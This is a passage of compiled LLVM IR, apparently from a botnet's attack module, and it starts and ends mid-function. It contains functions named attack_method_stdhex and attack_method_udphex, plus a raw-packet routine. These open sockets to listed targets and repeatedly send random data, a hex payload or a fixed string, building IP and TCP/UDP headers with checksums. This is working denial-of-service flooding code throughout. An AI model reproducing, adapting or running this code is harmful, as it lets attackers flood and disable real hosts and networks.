  %135 = getelementptr inbounds i8, i8* %104, i64 40
  %136 = bitcast i8* %135 to i32*
  store i32 %.140, i32* %136, align 4
  %137 = call zeroext i16 @htons(i16 zeroext %18) #12
  %138 = bitcast i8* %107 to i16*
  store i16 %137, i16* %138, align 2
  %139 = call zeroext i16 @htons(i16 zeroext %20) #12
  %140 = getelementptr inbounds i8, i8* %104, i64 46
  %141 = bitcast i8* %140 to i16*
  store i16 %139, i16* %141, align 2
  %142 = call zeroext i16 @htons(i16 zeroext %43) #12
  %143 = getelementptr inbounds i8, i8* %104, i64 48
  %144 = bitcast i8* %143 to i16*
  store i16 %142, i16* %144, align 2
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %145 = icmp slt i64 %indvars.iv.next, %44
  br i1 %145, label %.lr.ph127.split, label %..preheader_crit_edge.loopexit

.loopexit.loopexit:                               ; preds = %187
  br label %.loopexit.backedge

.loopexit.loopexit143:                            ; preds = %255
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %35, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit143
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %94, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %187
  %storemerge124126.us = phi i32 [ %214, %187 ], [ 0, %.lr.ph.split.us.preheader ]
  %146 = sext i32 %storemerge124126.us to i64
  %147 = getelementptr inbounds i8*, i8** %8, i64 %146
  %148 = load i8*, i8** %147, align 8
  %149 = getelementptr inbounds i8, i8* %148, i64 24
  %150 = bitcast i8* %149 to %struct.iphdr*
  %151 = getelementptr inbounds i8, i8* %148, i64 44
  %152 = getelementptr inbounds i8, i8* %148, i64 52
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %146, i32 2
  %154 = load i8, i8* %153, align 4
  %155 = icmp ult i8 %154, 32
  br i1 %155, label %156, label %163

; <label>:156:                                    ; preds = %.lr.ph.split.us
  %157 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %146, i32 1
  %158 = load i32, i32* %157, align 4
  %159 = call i32 @ntohl(i32 %158) #12
  %160 = call i32 @htonl(i32 %159) #12
  %161 = getelementptr inbounds i8, i8* %148, i64 16
  %162 = bitcast i8* %161 to i32*
  store i32 %160, i32* %162, align 4
  br label %163

; <label>:163:                                    ; preds = %.lr.ph.split.us, %156
  %164 = getelementptr inbounds i8, i8* %148, i64 12
  %165 = bitcast i8* %164 to i32*
  store i32 0, i32* %165, align 4
  br i1 %96, label %166, label %171

; <label>:166:                                    ; preds = %163
  %167 = getelementptr inbounds i8, i8* %148, i64 4
  %168 = bitcast i8* %167 to i16*
  store i16 0, i16* %168, align 4
  %169 = getelementptr inbounds i8, i8* %148, i64 28
  %170 = bitcast i8* %169 to i16*
  store i16 999, i16* %170, align 4
  br label %171

; <label>:171:                                    ; preds = %166, %163
  br i1 %98, label %172, label %174

; <label>:172:                                    ; preds = %171
  %173 = bitcast i8* %151 to i16*
  store i16 0, i16* %173, align 2
  br label %174

; <label>:174:                                    ; preds = %172, %171
  br i1 %100, label %175, label %178

; <label>:175:                                    ; preds = %174
  %176 = getelementptr inbounds i8, i8* %148, i64 46
  %177 = bitcast i8* %176 to i16*
  store i16 0, i16* %177, align 2
  br label %178

; <label>:178:                                    ; preds = %175, %174
  br i1 %101, label %183, label %179

; <label>:179:                                    ; preds = %178
  %180 = getelementptr inbounds i8, i8* %148, i64 16
  %181 = bitcast i8* %180 to i32*
  %182 = load i32, i32* %181, align 4
  br label %183

; <label>:183:                                    ; preds = %179, %178
  %.sink3.us = phi i32 [ %182, %179 ], [ 0, %178 ]
  %184 = getelementptr inbounds i8, i8* %148, i64 40
  %185 = bitcast i8* %184 to i32*
  store i32 %.sink3.us, i32* %185, align 4
  br i1 %102, label %187, label %186

; <label>:186:                                    ; preds = %183
  call void @rand_str(i8* nonnull %152, i32 %21)
  %.pre134 = load i32, i32* %5, align 4
  br label %187

; <label>:187:                                    ; preds = %186, %183
  %188 = phi i32 [ %.pre134, %186 ], [ %storemerge124126.us, %183 ]
  %189 = getelementptr inbounds i8, i8* %148, i64 10
  %190 = bitcast i8* %189 to i16*
  store i16 0, i16* %190, align 2
  %191 = bitcast i8* %148 to i16*
  %192 = call zeroext i16 @checksum_generic(i16* %191, i32 20)
  store i16 %192, i16* %190, align 2
  %193 = getelementptr inbounds i8, i8* %148, i64 34
  %194 = bitcast i8* %193 to i16*
  store i16 0, i16* %194, align 2
  %195 = bitcast i8* %149 to i16*
  %196 = call zeroext i16 @checksum_generic(i16* %195, i32 20)
  store i16 %196, i16* %194, align 2
  %197 = getelementptr inbounds i8, i8* %148, i64 50
  %198 = bitcast i8* %197 to i16*
  store i16 0, i16* %198, align 2
  %199 = getelementptr inbounds i8, i8* %148, i64 48
  %200 = bitcast i8* %199 to i16*
  %201 = load i16, i16* %200, align 2
  %202 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %150, i8* nonnull %151, i16 zeroext %201, i32 %103)
  store i16 %202, i16* %198, align 2
  %203 = sext i32 %188 to i64
  %204 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %203, i32 0, i32 0
  store i16 2, i16* %204, align 4
  %205 = getelementptr inbounds i8, i8* %148, i64 16
  %206 = bitcast i8* %205 to i32*
  %207 = load i32, i32* %206, align 4
  %208 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %203, i32 0, i32 2, i32 0
  store i32 %207, i32* %208, align 4
  %209 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %203, i32 0, i32 1
  store i16 0, i16* %209, align 2
  %210 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %203, i32 0
  %211 = bitcast %struct.sockaddr_in* %210 to %struct.sockaddr*
  %212 = call i64 @sendto(i32 %28, i8* nonnull %148, i64 %.pre136, i32 16384, %struct.sockaddr* %211, i32 16) #11
  %213 = load i32, i32* %5, align 4
  %214 = add nsw i32 %213, 1
  store i32 %214, i32* %5, align 4
  %215 = icmp slt i32 %214, %34
  br i1 %215, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %255
  %storemerge124126 = phi i32 [ %282, %255 ], [ 0, %.lr.ph.split.preheader ]
  %216 = sext i32 %storemerge124126 to i64
  %217 = getelementptr inbounds i8*, i8** %8, i64 %216
  %218 = load i8*, i8** %217, align 8
  %219 = getelementptr inbounds i8, i8* %218, i64 24
  %220 = bitcast i8* %219 to %struct.iphdr*
  %221 = getelementptr inbounds i8, i8* %218, i64 44
  %222 = getelementptr inbounds i8, i8* %218, i64 52
  %223 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %216, i32 2
  %224 = load i8, i8* %223, align 4
  %225 = icmp ult i8 %224, 32
  br i1 %225, label %226, label %233

; <label>:226:                                    ; preds = %.lr.ph.split
  %227 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %216, i32 1
  %228 = load i32, i32* %227, align 4
  %229 = call i32 @ntohl(i32 %228) #12
  %230 = call i32 @htonl(i32 %229) #12
  %231 = getelementptr inbounds i8, i8* %218, i64 16
  %232 = bitcast i8* %231 to i32*
  store i32 %230, i32* %232, align 4
  br label %233

; <label>:233:                                    ; preds = %.lr.ph.split, %226
  br i1 %96, label %234, label %239

; <label>:234:                                    ; preds = %233
  %235 = getelementptr inbounds i8, i8* %218, i64 4
  %236 = bitcast i8* %235 to i16*
  store i16 0, i16* %236, align 4
  %237 = getelementptr inbounds i8, i8* %218, i64 28
  %238 = bitcast i8* %237 to i16*
  store i16 999, i16* %238, align 4
  br label %239

; <label>:239:                                    ; preds = %234, %233
  br i1 %98, label %240, label %242

; <label>:240:                                    ; preds = %239
  %241 = bitcast i8* %221 to i16*
  store i16 0, i16* %241, align 2
  br label %242

; <label>:242:                                    ; preds = %240, %239
  br i1 %100, label %243, label %246

; <label>:243:                                    ; preds = %242
  %244 = getelementptr inbounds i8, i8* %218, i64 46
  %245 = bitcast i8* %244 to i16*
  store i16 0, i16* %245, align 2
  br label %246

; <label>:246:                                    ; preds = %243, %242
  br i1 %101, label %251, label %247

; <label>:247:                                    ; preds = %246
  %248 = getelementptr inbounds i8, i8* %218, i64 16
  %249 = bitcast i8* %248 to i32*
  %250 = load i32, i32* %249, align 4
  br label %251

; <label>:251:                                    ; preds = %246, %247
  %.sink3 = phi i32 [ %250, %247 ], [ 0, %246 ]
  %252 = getelementptr inbounds i8, i8* %218, i64 40
  %253 = bitcast i8* %252 to i32*
  store i32 %.sink3, i32* %253, align 4
  br i1 %102, label %255, label %254

; <label>:254:                                    ; preds = %251
  call void @rand_str(i8* nonnull %222, i32 %21)
  %.pre = load i32, i32* %5, align 4
  br label %255

; <label>:255:                                    ; preds = %251, %254
  %256 = phi i32 [ %storemerge124126, %251 ], [ %.pre, %254 ]
  %257 = getelementptr inbounds i8, i8* %218, i64 10
  %258 = bitcast i8* %257 to i16*
  store i16 0, i16* %258, align 2
  %259 = bitcast i8* %218 to i16*
  %260 = call zeroext i16 @checksum_generic(i16* %259, i32 20)
  store i16 %260, i16* %258, align 2
  %261 = getelementptr inbounds i8, i8* %218, i64 34
  %262 = bitcast i8* %261 to i16*
  store i16 0, i16* %262, align 2
  %263 = bitcast i8* %219 to i16*
  %264 = call zeroext i16 @checksum_generic(i16* %263, i32 20)
  store i16 %264, i16* %262, align 2
  %265 = getelementptr inbounds i8, i8* %218, i64 50
  %266 = bitcast i8* %265 to i16*
  store i16 0, i16* %266, align 2
  %267 = getelementptr inbounds i8, i8* %218, i64 48
  %268 = bitcast i8* %267 to i16*
  %269 = load i16, i16* %268, align 2
  %270 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %220, i8* nonnull %221, i16 zeroext %269, i32 %103)
  store i16 %270, i16* %266, align 2
  %271 = sext i32 %256 to i64
  %272 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %271, i32 0, i32 0
  store i16 2, i16* %272, align 4
  %273 = getelementptr inbounds i8, i8* %218, i64 16
  %274 = bitcast i8* %273 to i32*
  %275 = load i32, i32* %274, align 4
  %276 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %271, i32 0, i32 2, i32 0
  store i32 %275, i32* %276, align 4
  %277 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %271, i32 0, i32 1
  store i16 0, i16* %277, align 2
  %278 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %271, i32 0
  %279 = bitcast %struct.sockaddr_in* %278 to %struct.sockaddr*
  %280 = call i64 @sendto(i32 %28, i8* nonnull %218, i64 %.pre136, i32 16384, %struct.sockaddr* %279, i32 16) #11
  %281 = load i32, i32* %5, align 4
  %282 = add nsw i32 %281, 1
  store i32 %282, i32* %5, align 4
  %283 = icmp slt i32 %282, %34
  br i1 %283, label %.lr.ph.split, label %.loopexit.loopexit143

; <label>:284:                                    ; preds = %4, %92
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_stdhex(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #11
  %8 = bitcast i8* %7 to i8**
  %9 = tail call noalias i8* @calloc(i64 %6, i64 4) #11
  %10 = bitcast i8* %9 to i32*
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1294)
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = bitcast %struct.sockaddr_in* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %17, i8 0, i64 16, i32 4, i1 false)
  %18 = and i32 %13, 65535
  %19 = icmp eq i32 %18, 65535
  br i1 %19, label %23, label %20

; <label>:20:                                     ; preds = %4
  %21 = trunc i32 %13 to i16
  %22 = tail call zeroext i16 @htons(i16 zeroext %21) #12
  br label %23

; <label>:23:                                     ; preds = %4, %20
  %.061 = phi i16 [ %22, %20 ], [ 0, %4 ]
  %24 = zext i8 %0 to i32
  %25 = icmp eq i8 %0, 0
  br i1 %25, label %._crit_edge, label %.lr.ph68

.lr.ph68:                                         ; preds = %23
  %26 = and i32 %11, 65535
  %27 = icmp eq i32 %26, 65535
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %31 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %32 = zext i8 %0 to i64
  br i1 %27, label %.lr.ph68.split.us.preheader, label %.lr.ph68.split.preheader

.lr.ph68.split.preheader:                         ; preds = %.lr.ph68
  br label %.lr.ph68.split

.lr.ph68.split.us.preheader:                      ; preds = %.lr.ph68
  br label %.lr.ph68.split.us

.lr.ph68.split.us:                                ; preds = %.lr.ph68.split.us.preheader, %51
  %indvars.iv = phi i64 [ %indvars.iv.next, %51 ], [ 0, %.lr.ph68.split.us.preheader ]
  %33 = call noalias i8* @calloc(i64 65535, i64 1) #11
  %34 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %33, i8** %34, align 8
  %35 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv
  %36 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 1
  store i16 0, i16* %36, align 2
  %37 = call i32 @socket(i32 2, i32 2, i32 0) #11
  %38 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv
  store i32 %37, i32* %38, align 4
  %39 = icmp eq i32 %37, -1
  br i1 %39, label %.us-lcssa.us.loopexit, label %40

; <label>:40:                                     ; preds = %.lr.ph68.split.us
  store i16 2, i16* %28, align 4
  store i16 %.061, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %41 = call i32 @bind(i32 %37, %struct.sockaddr* nonnull %31, i32 16) #11
  %42 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 2
  %43 = load i8, i8* %42, align 4
  %44 = icmp ult i8 %43, 32
  br i1 %44, label %45, label %51

; <label>:45:                                     ; preds = %40
  %46 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %47 = load i32, i32* %46, align 4
  %48 = call i32 @ntohl(i32 %47) #12
  %49 = call i32 @htonl(i32 %48) #12
  %50 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 2, i32 0
  store i32 %49, i32* %50, align 4
  br label %51

; <label>:51:                                     ; preds = %45, %40
  %52 = bitcast %struct.attack_target* %35 to %struct.sockaddr*
  %53 = call i32 @connect(i32 %37, %struct.sockaddr* %52, i32 16) #11
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %54 = icmp slt i64 %indvars.iv.next, %32
  br i1 %54, label %.lr.ph68.split.us, label %._crit_edge.loopexit

.lr.ph68.split:                                   ; preds = %.lr.ph68.split.preheader, %74
  %indvars.iv73 = phi i64 [ %indvars.iv.next74, %74 ], [ 0, %.lr.ph68.split.preheader ]
  %55 = call noalias i8* @calloc(i64 65535, i64 1) #11
  %56 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv73
  store i8* %55, i8** %56, align 8
  %57 = call zeroext i16 @htons(i16 zeroext %12) #12
  %58 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv73
  %59 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv73, i32 0, i32 1
  store i16 %57, i16* %59, align 2
  %60 = call i32 @socket(i32 2, i32 2, i32 0) #11
  %61 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv73
  store i32 %60, i32* %61, align 4
  %62 = icmp eq i32 %60, -1
  br i1 %62, label %.us-lcssa.us.loopexit79, label %63

.us-lcssa.us.loopexit:                            ; preds = %.lr.ph68.split.us
  br label %.us-lcssa.us

.us-lcssa.us.loopexit79:                          ; preds = %.lr.ph68.split
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %.us-lcssa.us.loopexit79, %.us-lcssa.us.loopexit
  ret void

; <label>:63:                                     ; preds = %.lr.ph68.split
  store i16 2, i16* %28, align 4
  store i16 %.061, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %64 = call i32 @bind(i32 %60, %struct.sockaddr* nonnull %31, i32 16) #11
  %65 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv73, i32 2
  %66 = load i8, i8* %65, align 4
  %67 = icmp ult i8 %66, 32
  br i1 %67, label %68, label %74

; <label>:68:                                     ; preds = %63
  %69 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv73, i32 1
  %70 = load i32, i32* %69, align 4
  %71 = call i32 @ntohl(i32 %70) #12
  %72 = call i32 @htonl(i32 %71) #12
  %73 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv73, i32 0, i32 2, i32 0
  store i32 %72, i32* %73, align 4
  br label %74

; <label>:74:                                     ; preds = %68, %63
  %75 = bitcast %struct.attack_target* %58 to %struct.sockaddr*
  %76 = call i32 @connect(i32 %60, %struct.sockaddr* %75, i32 16) #11
  %indvars.iv.next74 = add nuw nsw i64 %indvars.iv73, 1
  %77 = icmp slt i64 %indvars.iv.next74, %32
  br i1 %77, label %.lr.ph68.split, label %._crit_edge.loopexit80

._crit_edge.loopexit:                             ; preds = %51
  br label %._crit_edge

._crit_edge.loopexit80:                           ; preds = %74
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit80, %._crit_edge.loopexit, %23
  %78 = load i8*, i8** @hexPayload, align 8
  %79 = call i64 @strlen(i8* %78) #14
  %80 = icmp eq i8 %16, 0
  %.mask = and i32 %14, 65535
  %81 = zext i32 %.mask to i64
  %sext = shl i64 %79, 32
  %82 = ashr exact i64 %sext, 32
  br i1 %25, label %.split.preheader, label %.split.us

.split.preheader:                                 ; preds = %._crit_edge
  br label %.split

.split.us:                                        ; preds = %._crit_edge
  br i1 %80, label %.lr.ph.split.us.us.preheader, label %.lr.ph..lr.ph.split_crit_edge.us.preheader

.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit: ; preds = %.lr.ph.split.us.us
  br label %.lr.ph..lr.ph.split_crit_edge.us.preheader

.lr.ph..lr.ph.split_crit_edge.us.preheader:       ; preds = %.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit, %.split.us
  %.not = xor i1 %80, true
  br label %.lr.ph..lr.ph.split_crit_edge.us

.lr.ph..lr.ph.split_crit_edge.us:                 ; preds = %.lr.ph..lr.ph.split_crit_edge.us.preheader, %.lr.ph..lr.ph.split_crit_edge.us
  %.163.us64 = phi i32 [ %.mux70, %.lr.ph..lr.ph.split_crit_edge.us ], [ 0, %.lr.ph..lr.ph.split_crit_edge.us.preheader ]
  %83 = sext i32 %.163.us64 to i64
  %84 = getelementptr inbounds i8*, i8** %8, i64 %83
  %85 = load i8*, i8** %84, align 8
  call void @rand_str(i8* %85, i32 %.mask)
  %86 = getelementptr inbounds i32, i32* %10, i64 %83
  %87 = load i32, i32* %86, align 4
  %88 = call i64 @send(i32 %87, i8* %85, i64 %81, i32 16384) #11
  %89 = load i8*, i8** @hexPayload, align 8
  %90 = call i64 @send(i32 %87, i8* %89, i64 %82, i32 16384) #11
  %91 = add nsw i32 %.163.us64, 1
  %92 = icmp slt i32 %91, %24
  %brmerge69 = or i1 %92, %.not
  %.mux70 = select i1 %92, i32 %91, i32 0
  br i1 %brmerge69, label %.lr.ph..lr.ph.split_crit_edge.us, label %.lr.ph.split.us.us.preheader.loopexit

.lr.ph.split.us.us.preheader.loopexit:            ; preds = %.lr.ph..lr.ph.split_crit_edge.us
  br label %.lr.ph.split.us.us.preheader

.lr.ph.split.us.us.preheader:                     ; preds = %.lr.ph.split.us.us.preheader.loopexit, %.split.us
  br label %.lr.ph.split.us.us

.lr.ph.split.us.us:                               ; preds = %.lr.ph.split.us.us.preheader, %.lr.ph.split.us.us
  %.163.us.us = phi i32 [ %.mux, %.lr.ph.split.us.us ], [ 0, %.lr.ph.split.us.us.preheader ]
  %93 = sext i32 %.163.us.us to i64
  %94 = getelementptr inbounds i8*, i8** %8, i64 %93
  %95 = load i8*, i8** %94, align 8
  %96 = getelementptr inbounds i32, i32* %10, i64 %93
  %97 = load i32, i32* %96, align 4
  %98 = call i64 @send(i32 %97, i8* %95, i64 %81, i32 16384) #11
  %99 = load i8*, i8** @hexPayload, align 8
  %100 = call i64 @send(i32 %97, i8* %99, i64 %82, i32 16384) #11
  %101 = add nsw i32 %.163.us.us, 1
  %102 = icmp slt i32 %101, %24
  %brmerge = or i1 %102, %80
  %.mux = select i1 %102, i32 %101, i32 0
  br i1 %brmerge, label %.lr.ph.split.us.us, label %.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit

.split:                                           ; preds = %.split.preheader, %.split
  br label %.split
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udphex(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #11
  %8 = bitcast i8* %7 to i8**
  %9 = tail call noalias i8* @calloc(i64 %6, i64 4) #11
  %10 = bitcast i8* %9 to i32*
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1294)
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = bitcast %struct.sockaddr_in* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %17, i8 0, i64 16, i32 4, i1 false)
  %18 = and i32 %13, 65535
  %19 = icmp eq i32 %18, 65535
  br i1 %19, label %23, label %20

; <label>:20:                                     ; preds = %4
  %21 = trunc i32 %13 to i16
  %22 = tail call zeroext i16 @htons(i16 zeroext %21) #12
  br label %23

; <label>:23:                                     ; preds = %4, %20
  %.056 = phi i16 [ %22, %20 ], [ 0, %4 ]
  %24 = zext i8 %0 to i32
  %25 = icmp eq i8 %0, 0
  br i1 %25, label %.preheader.split.preheader, label %.lr.ph63

.preheader.split.preheader:                       ; preds = %.preheader, %23
  br label %.preheader.split

.lr.ph63:                                         ; preds = %23
  %26 = and i32 %11, 65535
  %27 = icmp eq i32 %26, 65535
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %31 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %32 = zext i8 %0 to i64
  br i1 %27, label %.lr.ph63.split.us.preheader, label %.lr.ph63.split.preheader

.lr.ph63.split.preheader:                         ; preds = %.lr.ph63
  br label %.lr.ph63.split

.lr.ph63.split.us.preheader:                      ; preds = %.lr.ph63
  br label %.lr.ph63.split.us

.lr.ph63.split.us:                                ; preds = %.lr.ph63.split.us.preheader, %51
  %indvars.iv = phi i64 [ %indvars.iv.next, %51 ], [ 0, %.lr.ph63.split.us.preheader ]
  %33 = call noalias i8* @calloc(i64 65535, i64 1) #11
  %34 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %33, i8** %34, align 8
  %35 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv
  %36 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 1
  store i16 0, i16* %36, align 2
  %37 = call i32 @socket(i32 2, i32 2, i32 17) #11
  %38 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv
  store i32 %37, i32* %38, align 4
  %39 = icmp eq i32 %37, -1
  br i1 %39, label %.us-lcssa.us.loopexit, label %40

; <label>:40:                                     ; preds = %.lr.ph63.split.us
  store i16 2, i16* %28, align 4
  store i16 %.056, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %41 = call i32 @bind(i32 %37, %struct.sockaddr* nonnull %31, i32 16) #11
  %42 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 2
  %43 = load i8, i8* %42, align 4
  %44 = icmp ult i8 %43, 32
  br i1 %44, label %45, label %51

; <label>:45:                                     ; preds = %40
  %46 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %47 = load i32, i32* %46, align 4
  %48 = call i32 @ntohl(i32 %47) #12
  %49 = call i32 @htonl(i32 %48) #12
  %50 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 2, i32 0
  store i32 %49, i32* %50, align 4
  br label %51

; <label>:51:                                     ; preds = %45, %40
  %52 = bitcast %struct.attack_target* %35 to %struct.sockaddr*
  %53 = call i32 @connect(i32 %37, %struct.sockaddr* %52, i32 16) #11
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %54 = icmp slt i64 %indvars.iv.next, %32
  br i1 %54, label %.lr.ph63.split.us, label %.preheader.loopexit

.preheader.loopexit:                              ; preds = %51
  br label %.preheader

.preheader.loopexit75:                            ; preds = %90
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit75, %.preheader.loopexit
  %55 = icmp eq i8 %16, 0
  %56 = and i32 %14, 65535
  br i1 %25, label %.preheader.split.preheader, label %.preheader.split.us

.preheader.split.us:                              ; preds = %.preheader
  br i1 %55, label %.lr.ph.split.us.us.preheader, label %.lr.ph..lr.ph.split_crit_edge.us.preheader

.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit: ; preds = %.lr.ph.split.us.us
  br label %.lr.ph..lr.ph.split_crit_edge.us.preheader

.lr.ph..lr.ph.split_crit_edge.us.preheader:       ; preds = %.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit, %.preheader.split.us
  %.not = xor i1 %55, true
  br label %.lr.ph..lr.ph.split_crit_edge.us

.lr.ph..lr.ph.split_crit_edge.us:                 ; preds = %.lr.ph..lr.ph.split_crit_edge.us.preheader, %.lr.ph..lr.ph.split_crit_edge.us
  %.158.us59 = phi i32 [ %.mux65, %.lr.ph..lr.ph.split_crit_edge.us ], [ 0, %.lr.ph..lr.ph.split_crit_edge.us.preheader ]
  %57 = sext i32 %.158.us59 to i64
  %58 = getelementptr inbounds i8*, i8** %8, i64 %57
  %59 = load i8*, i8** %58, align 8
  call void @rand_str(i8* %59, i32 %56)
  %60 = getelementptr inbounds i32, i32* %10, i64 %57
  %61 = load i32, i32* %60, align 4
  %62 = call i64 @send(i32 %61, i8* getelementptr inbounds ([1021 x i8], [1021 x i8]* @.str, i64 0, i64 0), i64 1458, i32 16384) #11
  %63 = add nsw i32 %.158.us59, 1
  %64 = icmp slt i32 %63, %24
  %brmerge64 = or i1 %64, %.not
  %.mux65 = select i1 %64, i32 %63, i32 0
  br i1 %brmerge64, label %.lr.ph..lr.ph.split_crit_edge.us, label %.lr.ph.split.us.us.preheader.loopexit

.lr.ph.split.us.us.preheader.loopexit:            ; preds = %.lr.ph..lr.ph.split_crit_edge.us
  br label %.lr.ph.split.us.us.preheader

.lr.ph.split.us.us.preheader:                     ; preds = %.lr.ph.split.us.us.preheader.loopexit, %.preheader.split.us
  br label %.lr.ph.split.us.us

.lr.ph.split.us.us:                               ; preds = %.lr.ph.split.us.us.preheader, %.lr.ph.split.us.us
  %.158.us.us = phi i32 [ %.mux, %.lr.ph.split.us.us ], [ 0, %.lr.ph.split.us.us.preheader ]
  %65 = sext i32 %.158.us.us to i64
  %66 = getelementptr inbounds i32, i32* %10, i64 %65
  %67 = load i32, i32* %66, align 4
  %68 = call i64 @send(i32 %67, i8* getelementptr inbounds ([1021 x i8], [1021 x i8]* @.str, i64 0, i64 0), i64 1458, i32 16384) #11
  %69 = add nsw i32 %.158.us.us, 1
  %70 = icmp slt i32 %69, %24
  %brmerge = or i1 %70, %55
  %.mux = select i1 %70, i32 %69, i32 0
  br i1 %brmerge, label %.lr.ph.split.us.us, label %.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit

.lr.ph63.split:                                   ; preds = %.lr.ph63.split.preheader, %90
